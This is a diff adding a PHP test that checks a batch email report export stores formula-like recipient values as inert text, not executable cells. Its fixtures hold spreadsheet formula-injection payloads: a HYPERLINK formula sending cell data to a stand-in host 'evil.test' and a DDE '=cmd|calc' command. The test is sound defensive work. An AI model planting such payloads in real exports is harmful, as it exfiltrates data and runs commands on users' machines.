@@ -126,6 +126,29 @@ class BatchReportExportTest extends TestCase
         $this->assertCount(1, (new BatchReportExport($mine))->collection());
     }
 
+    public function test_a_formula_in_recipient_data_is_not_executable_in_the_export(): void
+    {
+        $batch = EmailBatch::factory()->create();
+
+        EmailLog::factory()->create([
+            'batch_id' => $batch->id,
+            'name'     => '=HYPERLINK("http://evil.test?x="&A1,"click")',
+            'status'   => EmailLog::STATUS_FAILED,
+            'remarks'  => '=cmd|calc!A1',
+        ]);
+
+        \Maatwebsite\Excel\Facades\Excel::store(new BatchReportExport($batch), 'formula-check.xlsx', 'local');
+        $path = \Illuminate\Support\Facades\Storage::disk('local')->path('formula-check.xlsx');
+
+        $sheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($path)->getActiveSheet();
+
+        // 'f' would mean Excel executes it on open; 's' is inert text.
+        $this->assertSame('s', $sheet->getCell('A2')->getDataType());
+        $this->assertSame('s', $sheet->getCell('G2')->getDataType());
+
+        @unlink($path);
+    }
+
     public function test_the_sample_template_has_the_expected_columns_and_rows(): void
     {
         $export = new SampleTemplateExport();
